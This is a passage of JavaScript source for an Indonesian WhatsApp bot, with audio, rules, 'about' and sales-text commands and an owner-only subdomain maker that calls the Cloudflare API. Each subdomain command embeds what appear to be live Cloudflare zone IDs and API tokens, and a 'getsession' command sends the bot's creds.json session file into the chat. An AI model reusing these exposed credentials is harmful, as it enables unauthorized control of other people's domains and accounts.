case 'mangkane49':
case 'mangkane50':
case 'mangkane51':
case 'mangkane52':
case 'mangkane53':
case 'mangkane54':
case '.acumalaka':
case '.reza-kecap':
case '.farhan-kebab':
case '.omaga':
case '.kamu-nanya':
case '.anjay':
case '.siuu':
viot = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
thumb = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
let sound
if (/sound/.test(command)) sound = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') < 25) sound = `https://raw.githubusercontent.com/hyuura/Rest-Sound/main/HyuuraKane/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') > 24) sound = `https://raw.githubusercontent.com/aisyah-rest/mangkane/main/Mangkanenya/${command}.mp3`
if (/acumalaka|reza-kecap|farhan-kebab|omaga|omaga|kamu-nanya|anjay|siuu/.test(command)) sound = `https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`
if (text.toLowerCase() === 'thumb') {
await TradzSigma.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false, 
contextInfo: {
externalAdReply: {
mediaUrl: 'https://instagram.com/Cyaa_ches1', 
mediaType: 2, 
title: '  ⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻  ', 
body: '  ━━━━⬤──────────  ', 
description: 'Now Playing...',
mediaType: 2, 
sourceUrl: 'https://instagram.com/Cyaa_ches1',
thumbnail: await (await fetch(viot)).buffer(), 
renderLargerThumbnail: true}}}, {quoted: m})
} else await TradzSigma.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false}, {quoted: m})
break
case 'friend':
case 'searchfriend':{
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let teman = pickRandom(verifikasiuser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replyviex('Berhasil Mendapatkan Satu Orang')
}, 5000)
setTimeout(() => {
TradzSigma.sendMessage(from, {text: `Di Sini @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'bacaperaturan':
case 'rules': {
  const cap = `📜 *Rules Jinshi | MD✨ MultiDevice*  

1. ❌ *Jangan spam bot.* Spam = *banned*.  
2. 🔄 Jika bot tidak merespons *1x*, coba lagi. Jika *2x*, berarti delay — *tunggu dulu*.  
3. 💌 *Belum donasi?* Gunakan bot dengan bijak, *jangan spam*.  
4. ⏳ *Limit habis?* Main game untuk dapat *exp*. Contoh: 🎮 tebak-tebakan, ⚔️ RPG, dll.  
5. 🚫 *Dilarang* kirim *virtex/bug* ke bot.  
6. 📞 *Menelpon bot?* = *blokir otomatis*.  
7. 🤔 *Bingung* cara pakai bot? Tanya member lain atau ketik *#gcbot* untuk join grup.  
8. ⚠️ *Fitur error* atau bingung cara pakainya? *Laporkan ke owner*.  
9. 🐢 Jika bot *delay*, jangan langsung *spam*.  
10. ⭐ *User premium* tetap *dilarang* kirim bug sembarangan.

Semoga membantu! 🚀✨
`
replyviex(cap)
}
break
case 'about':
case 'tentang': {
  const cap = `Di tepi pantai yang sunyi 🌴, Jinshi duduk di atas batu karang yang licin. Angin malam berhembus pelan 🍃, membawa aroma asin dan suara deburan ombak yang seolah berbisik 🗝️. Matanya menatap jauh ke laut lepas 🌌, di mana bulan purnama 🌕 memantulkan cahaya keperakan di permukaan air.  

Sejak kecil, Jinshi selalu merasa terpanggil oleh suara laut 🌊. Orang-orang desa percaya bahwa gelombang membawa pesan dari dunia lain—dunia para arwah 👻 dan roh penjaga 🛡️. Tapi Jinshi tidak takut. Ia justru merasa tenang, seolah laut adalah sahabat lama yang selalu menunggu ceritanya 📖.  

Malam itu, sesuatu yang aneh terjadi.  

Ombak yang biasanya bergulung-gulung dengan ritme teratur tiba-tiba menjadi diam ⏸️. Lalu, dari kejauhan, terdengar suara nyanyian lembut 🎵. Suara itu memanggil namanya.  

*"Jinshi… ikutlah…"*  

Jantungnya berdegup kencang 💓. Ia tahu ini bukan hal biasa. Tapi rasa penasarannya mengalahkan ketakutan. Perlahan, ia melangkah ke arah suara itu, air laut menyentuh ujung kakinya yang telanjang 👣.  

Tiba-tiba, sebuah tangan kecil muncul dari air—seperti tangan seorang anak 👶, tapi bersinar biru pucat 💠. Jinshi hampir menjerit 😱, tapi tangan itu hanya mengulurkan sesuatu: sebuah kalung kuno dengan liontin batu giok yang retak 🌀.  

*"Jaga ini…"* bisik suara itu sebelum menghilang bersama ombak 🌊.  

Sejak malam itu, Jinshi sering bermimpi tentang seorang gadis kecil yang tersesat di antara gelombang 🌙. Ia yakin, kalung itu adalah kunci 🔑 untuk membebaskannya.  

Maka, dengan tekad bulat ⚔️, Jinshi memutuskan untuk menyelami misteri laut yang selama ini memanggilnya—meski ia tahu, mungkin ia tak akan kembali sama.  

**✨ Laut tak pernah berbohong. Ia hanya menyimpan rahasia di balik gelombangnya yang abadi. ✨**  

*Akhir cerita.*  

💬 *Apa yang akan Jinshi temukan di kedalaman? Mungkin hanya gelombang yang tahu…* 🌊🌀  

🔥 *Misteri atau petualangan? Pilih jalannya!* 🔥  
🎭 *Bagaimana kelanjutannya? Kalian yang tentukan!* 🎭
`
replyviex(cap)
}
break
case "script": case "sc": {
let buy = `
*🛒 Sell Script Bot Jinghi MD*

🧾 Features On Bot
*Cpanel Pterodactyl*
* Cpanel Srv1
* Cpanel Srv2
* Cpanel Srv3
*Features Download*
* Instagram
* TikTok
* TikTok (HD)
* Facebook
* Facebook (HD)
* Pinteres
* Videy
* YT Download (Mp3/Mp4) Using Scraper
* (Full Scraper)
* DLL
*NSFW Menu*
* Xnxx Search
* Xnxx Download
* Bokep
* Hentai
*Features Game*
* Cek Femboy
* TebakKata
* TebakBom
* TebakAnime
* TebakGame
* TebakLirik
* TebakLagu
* SiapakahAku?
* Family100
* YouTuber
* DLL
*Spesial Features*
* Ml stalk ( with region )
* Mc status ( Cek status server mc )
* DLL


🧾 Info Script
*Script Baileys*
* Type Case
* Module (baileys)
* Support All Button

🏷️ Price List
* Price *Rp.15,000*
* Garansi 15 Days
* Free ApiKey
* No Update!!

* Price *Rp.40,000*
* Garansi 3 Bulan
* Free ApiKey
* Free Update

mau sc ini?, jika benar mau silahkan hubungi nomer di bawah ini

ᴏᴡɴᴇʀ :
${global.owner}
`
TradzSigma.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 40000000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
await sleep(2500)
}
break;
case 'getsession':
if (!TradID) return replyviex(mess.only.owner)
replyviex('Tunggu sebentar, saat ini sedang mengambil file sesi Anda')
let sesi = await fs.readFileSync('./DinzID_Chx/creds.json')
TradzSigma.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {
quoted: m
})
break
case 'subdomain': {
const text12 = `Hai Kak @${sender.split("@")[0]}

❏━━『 *LIST DOMAIN BY ${ownername}* 』━━
┣•○⊱d1 kedai-panel.my.id
┣•○⊱d2 piwzstoreee.my.id
┣•○⊱d3 piwzpediaaa.biz.id
┣•○⊱d4 piwzpanel.me
┣•○⊱d5 r0ulxye4.my.id
┣•○⊱d6 lanzpanel.my.id
┣•○⊱d7 cpanel-vip.my.id (khusus cpanel)
┣•○⊱d8 kukurahost.my.id
┣•○⊱d9 tokopanellku.my.id
┣•○⊱d10 kiospanell.my.id
┣•○⊱d11 moon-offc.my.id
┣•○⊱d12 moon-ooffc.biz.id
┣•○⊱d13 tokopanellmurah.my.id
┣•○⊱d14 bisnispanel.my.id
┣•○⊱d15 tokopanel.biz.id
┣•○⊱d16 store-panel.biz.id
┣•○⊱d17 sellerpanel.biz.id
┣•○⊱d18 mypanel.my.id
┣•○⊱d19 kangpanel.biz.id
┣•○⊱d20 jasapanel.my.id
┣•○⊱d21 dewapanel.my.id
┣•○⊱d22 adminpanel.biz.id
┣•○⊱d23 plerkuda.my.id
┣•○⊱d24 cafegt.my.id
┣•○⊱d25 shopwebsite.my.id
┣•○⊱d26 sellerpanel-vvip.my.id
┣•○⊱d27 ekioffcial.biz.id
┣•○⊱d28 panelku-jasteb.my.id
┣•○⊱d29 pannel-pvrt.my.id
┣•○⊱d30 sellerpanell.my.id
┣•○⊱d31 pannelkuu.biz.id
┣•○⊱d32 server-smtp1.my.id
┣•○⊱d33 my-website.my.id
┣•○⊱d34 smtp1.my.id
┣•○⊱d35 mefahri.biz.id 
┣•○⊱d36 mefahri.biz.id 
┣•○⊱d37 didindev.my.id
┣•○⊱d38 ruztanxd.my.id
┣•○⊱d39 sellerpanell-store.xyz
┣•○⊱d40 rafeyfah.my.id
┣•○⊱d41 kayy.me
┣•○⊱d42 kayyoffc.tech
┣•○⊱d43 kayypedia.com
┣•○⊱d44 panellstoree.com
┣•○⊱d45 windastore.live
┣•○⊱d46 zanofc.biz.id
┗━═┅═━━━๑
   ©${namabot}
*NOTE :*
•○⊱𝙎𝙚𝙨𝙖𝙢𝙖 𝙈𝙚𝙢𝙗𝙚𝙧 𝘿𝙞 𝙇𝙖𝙧𝙖𝙣𝙜 𝙎𝙖𝙡𝙞𝙣𝙜 𝘿𝘿𝙊𝙎
•○⊱𝘽𝙤𝙡𝙚𝙝 𝘿𝙞 𝙋𝙖𝙠𝙚 𝙐𝙣𝙩𝙪𝙠 𝙒𝙃𝙈/𝘾𝙥𝙖𝙣𝙚𝙡 𝘼𝙨𝙖𝙡 𝙉𝙜𝙤𝙩𝙖𝙠`
TradzSigma.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: 'subdomain',
"thumbnailUrl": 'https://telegra.ph/file/49f2b139a2aff4bb934f7.jpg',
sourceUrl: global.my.ch,
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
}
break
case 'd1': {
 if (!TradID) return replyviex(mess.only.owner)
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "5d00f56aee3afd9cc4e0666bc8f23746";
    let apitoken = "mjR4BdiOo6aFO3uPl8BTgZIgOMH3asLbgVsOpEfO";
    let tld = "kedai-panel.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = ${namabot}\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
 
           case 'd2': {
        if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f374d347f22dc1b0ac208973f185c1f2";
               let apitoken = "m7Xe_0qhlv8enPURlO7UYRSR1-3C7u-uOUkZtvZa";
               let tld = "piwzstoreee.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = ${namabot}\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
  case 'd3': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c1812c92fb249258e67a28573ca34344";
               let apitoken = "mqAjTHuT_GsaZsWcIjbllV-rrrtJHwyVxVeYlL1A";
               let tld = "piwzpediaaa.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = ${namabot}\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
  break       
  
  case 'd4': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3cea2e71ec2bc82ea7865da5999d04b1";
               let apitoken = "eyOrW0eUPe0VxhQzzubXhY1w8X_Z120crfqpsNwL";
               let tld = "piwzpanel.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = ${namabot}\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
 case 'd5': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c2c8ddf4f1bfd0d0c11eb0ed83a634f9";
               let apitoken = "RHmElwWM5pEb3HsWi82uramdhi9wzDsaU8F9JV6F";
               let tld = "r0ulxye4.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = ${namabot}\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break                                                                               
 
 case 'd6': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "7432f024eeeaa0367fd985a18b2729cc";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ";
               let tld = "lanzpanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
  break  
case 'd7': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "891a2e5d4ac5b3db4fbcef8d9088ad38";
               let apitoken = "V2BCJ-jhHXQlkN5-_Jv-CuXEtJbLT9fo7NWAlMK2";
               let tld = "cpanel-vip.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
     case 'd8': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a0cef62d7194b16e1706f5d48c41129a";
               let apitoken = "_xnkxZ50i8J5p0Y148oSlomu0NoIt2mTGWxu0CsR"
               let tld = "kukurahost.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break 
 
     case 'd9': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5f4a582dd80c518fb2c7a425256fb491";
               let apitoken = "iQbJQgfe6kTyEfdOy_EV8UAHKj80VgQg4t6rTjby"
               let tld = "tokopanellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case 'd10': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "15b97d8a42af1c00a70070e577ce7301";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ"
               let tld = "kiospanell.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
